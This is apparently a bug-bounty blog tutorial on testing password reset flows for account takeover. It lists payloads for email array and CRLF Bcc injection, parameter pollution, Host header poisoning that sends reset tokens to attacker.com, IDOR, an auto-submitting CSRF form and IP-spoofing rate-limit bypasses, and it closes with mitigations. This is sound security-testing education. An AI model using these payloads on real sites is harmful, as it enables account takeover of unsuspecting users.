---
title: Password Reset Vulnerability Testing
date: 2026-07-16
categories: [Web Security, Bug Bounty]
tags:
  [
    Password-Reset,
    Account-Takeover,
    Host-Header-Poisoning,
    IDOR,
    Race-Condition,
    Web-Security,
  ]
---

---

# Introduction

Password reset functionality is one of the most sensitive features in any web application. A single implementation flaw can lead to full Account Takeover (ATO), allowing attackers to gain unauthorized access without knowing the victim's password.

Because password reset flows often involve multiple components—including email services, APIs, authentication systems, reverse proxies, and user management logic they frequently contain subtle security weaknesses.

This article documents a practical methodology for testing password reset mechanisms and highlights common vulnerabilities that have historically led to critical security findings.

---

# Vulnerability Overview

Password reset vulnerabilities occur when an application improperly validates:

- User identity
- Reset tokens
- Email ownership
- Request parameters
- Generated reset links

Common outcomes include:

- Account Takeover (ATO)
- Unauthorized password changes
- Token disclosure
- User enumeration
- Email abuse
- Denial of Service (DoS)

---

# How It Works

A typical password reset flow looks like this:

```text
User Requests Password Reset
            │
            ▼
Server Generates Reset Token
            │
            ▼
Token Sent Via Email
            │
            ▼
User Opens Reset Link
            │
            ▼
New Password Submitted
            │
            ▼
Password Updated
```

Security failures can occur at any stage of this workflow.

---

# Root Cause

Most password reset vulnerabilities originate from one or more of the following issues:

- Trusting user-controlled input
- Improper email validation
- Weak token generation
- Missing authorization checks
- Unsafe proxy/header handling
- Race conditions
- Inconsistent backend parsing
- Lack of CSRF protection
- Insufficient rate limiting

---

# Real World Example

One notable example involved GitLab, where researchers discovered that password reset requests could accept multiple email addresses.

The application generated a valid reset token for the victim account but also delivered the email to an attacker-controlled address.

Example payload:

```json
{
  "email": ["victim@gmail.com", "attacker@gmail.com"]
}
```

If successful, the attacker receives the victim's password reset token, leading to Account Takeover.

---

# Discovery Methodology

When assessing password reset functionality, test the following areas:

1. Email parameter manipulation
2. HTTP parameter pollution
3. JSON injection
4. Host header poisoning
5. Token lifecycle validation
6. IDOR vulnerabilities
7. Race conditions
8. Email canonicalization bypasses
9. CSRF weaknesses
10. Hidden API endpoints
11. Rate limit bypasses
12. Header spoofing
13. Token generation flaws

---

# Exploitation

## Email Parameter Manipulation

Some applications incorrectly process multiple email values.

### Array Injection

```json
{
  "email": ["victim@gmail.com", "attacker@gmail.com"]
}
```

### Comma-Separated Values

```http
email=victim@gmail.com,attacker@gmail.com
```

### Pipe-Separated Values

```http
email=victim@gmail.com|attacker@gmail.com
```

### CRLF Injection

```http
email=victim@gmail.com%0d%0aBcc:attacker@gmail.com
```

```http
email=victim@gmail.com%0d%0aCc:attacker@gmail.com
```

### Goal

Receive a valid password reset token intended for the victim account.

---

## HTTP Parameter Pollution (HPP)

Applications may process duplicate parameters differently.

### Example

```http
POST /forgot-password HTTP/1.1

email=victim@gmail.com&email=attacker@gmail.com
```

Reverse the order:

```http
email=attacker@gmail.com&email=victim@gmail.com
```

Try array variations:

```http
email=victim@gmail.com&
email=attacker@gmail.com&
email[]=attacker@gmail.com
```

### Why It Works

Different frameworks handle duplicate parameters differently:

```text
PHP       → Last Value Wins
ASP.NET   → First Value Wins
Node.js   → Array Handling
Java      → Framework Dependent
```

---

## JSON Injection

Many APIs parse JSON inconsistently.

### Duplicate Keys

```json
{
  "email": "victim@gmail.com",
  "email": "attacker@gmail.com"
}
```

### Additional Email Fields

```json
{
  "email": "victim@gmail.com",
  "backup_email": "attacker@gmail.com"
}
```

### Nested Objects

```json
{
  "email": "victim@gmail.com",
  "user": {
    "email": "attacker@gmail.com"
  }
}
```

### Objective

Determine which value the backend ultimately uses.

---

## Host Header Poisoning

One of the most powerful password reset vulnerabilities.

Some applications generate reset URLs using the incoming Host header.

### Example Request

```http
POST /forgot-password HTTP/1.1
Host: attacker.com
X-Forwarded-Host: attacker.com

email=victim@gmail.com
```

### Result

The victim receives:

```text
https://attacker.com/reset?token=XXXX
```

When the victim clicks the link, the reset token is sent to infrastructure controlled by the attacker.

### Additional Headers To Test

```http
X-Forwarded-Host
X-Host
X-Original-Host
Forwarded
X-Forwarded-Server
X-Rewrite-URL
X-Original-URL
Origin
Referer
```

---

## Reset Token Reuse

Reset tokens should be:

- Single use
- Time limited
- Bound to a specific account

### Test

```text
1. Request reset token
2. Change password
3. Reuse same token
```

### Vulnerable Behavior

If the token remains valid after use:

```text
Password Reset → Success
Password Reset Again → Success
```

This may enable persistent Account Takeover.

---

## IDOR in Reset Endpoint

Inspect the final password reset request.

### Example

```json
{
  "user_id": 123,
  "token": "VALIDTOKEN",
  "password": "P@ss1234"
}
```

Modify:

```json
{
  "user_id": 124,
  "token": "VALIDTOKEN",
  "password": "P@ss1234"
}
```

### Impact

If accepted, attackers may reset passwords for arbitrary users.

---

## Race Conditions

Send multiple requests simultaneously.

### Goals

- Token confusion
- Shared token generation
- State desynchronization

### Tools

- Burp Suite Repeater Group
- Turbo Intruder
- Race Condition Extension

### Interesting Scenario

If two users request password resets simultaneously and receive identical tokens:

```text
User A Token = ABC123
User B Token = ABC123
```

This can lead to cross-account compromise.

---

## Referrer Manipulation

Some applications trust values supplied in the Referer header.

### Example

```http
Referer: /reset?email=victim@gmail.com
```

If the backend improperly uses this value during reset generation, tokens may be issued for unintended accounts.

---

## Email Canonicalization Bypass

Different email providers normalize addresses differently.

### Test Variations

```text
victim@gmail.com
victim+test@gmail.com
victim+1@gmail.com
victim.victim24@gmail.com
victim@googlemail.com
```

### Unicode Testing

```text
victimvictіm24@gmail.com
```

Notice that the character "і" may not be the standard Latin "i".

### Impact

Account confusion and ownership validation bypasses.

---

## Password Reset CSRF

If the reset workflow lacks CSRF protection, an attacker may force a victim's browser to submit requests.

### Example Attack

```html
<form action="https://target.com/reset-password" method="POST">
  <input name="password" value="NewPassword123" />
</form>

<script>
  document.forms[0].submit();
</script>
```

### Impact

Unauthorized password changes.

---

## Hidden API Reset Endpoints

Developers often expose undocumented reset functionality.

### Common Targets

```text
/api/reset-password
/api/v2/reset
/internal/reset
/admin/reset
/graphql
```

### Example

```http
POST /api/su/resetPwd

username=admin
```

Hidden endpoints frequently bypass protections present in the public interface.

---

## Rate Limit Bypass

Password reset endpoints should enforce rate limits.

### Baseline Request

```http
POST /forgot-password HTTP/1.1

email=victim@gmail.com
```

### Testing Objectives

- Email flooding
- OTP brute force
- Resource exhaustion
- User harassment

### Bypass Techniques

```http
X-Forwarded-For
X-Real-IP
Client-IP
True-Client-IP
```

Rotate values to determine whether limits are enforced per IP.

---

## Header Spoofing

Some applications trust client-supplied headers.

### Test Headers

```http
X-Forwarded-For: 1.1.1.1
X-Real-IP: 1.1.1.1
X-Originating-IP: 1.1.1.1
Client-IP: 1.1.1.1
True-Client-IP: 1.1.1.1
```

### Goal

Bypass IP-based controls and abuse protections.

---

## Different Accounts Sharing One Token

A critical race-condition scenario.

### Test Procedure

1. Trigger password resets for multiple accounts simultaneously.
2. Capture generated reset links.
3. Compare reset tokens.

### Vulnerable Behavior

```text
Victim Token   = XYZ123
Attacker Token = XYZ123
```

### Impact

Cross-account password resets and complete Account Takeover.

---

## Array Injection Testing

Some APIs unexpectedly accept arrays.

### Example

```json
{
  "email": ["", ""]
}
```

Expand testing with:

```json
{
  "email": ["victim@gmail.com", "attacker@gmail.com"]
}
```

---

# Impact

Successful password reset vulnerabilities can result in:

- Full Account Takeover
- Privilege Escalation
- Sensitive Data Exposure
- Administrative Access
- User Lockout
- Email Abuse
- Service Disruption

Severity is typically High or Critical because authentication controls are directly affected.

---

# Mitigation

Organizations should:

### Validate Inputs

Accept only a single email address.

### Ignore User-Controlled Headers

Never generate reset URLs using:

```text
Host
X-Forwarded-Host
Origin
Referer
```

### Secure Tokens

- Cryptographically random
- Single use
- Short expiration
- Bound to user identity

### Implement CSRF Protection

Protect all state-changing requests.

### Apply Rate Limiting

Limit requests per:

- Account
- Email
- IP Address
- Device

### Prevent Race Conditions

Use transactional operations and atomic token generation.

### Normalize Email Addresses

Apply consistent canonicalization before account lookup.

---

# References

- OWASP Forgot Password Cheat Sheet
- OWASP Web Security Testing Guide
- PortSwigger Web Security Academy
- GitLab Security Advisories
- HackerOne Public Reports
- YesWeHack Disclosure Reports

---

# Key Takeaways

- Password reset functionality is a frequent source of critical vulnerabilities.
- Host Header Poisoning remains one of the most impactful attack vectors.
- Parameter Pollution and JSON Injection can reveal backend parsing inconsistencies.
- Reset tokens must always be single-use and tightly bound to user accounts.
- Race conditions can introduce unexpected authentication bypasses.
- Hidden APIs often expose weaker implementations than public interfaces.
- Comprehensive testing of password reset flows should be part of every web application security assessment.
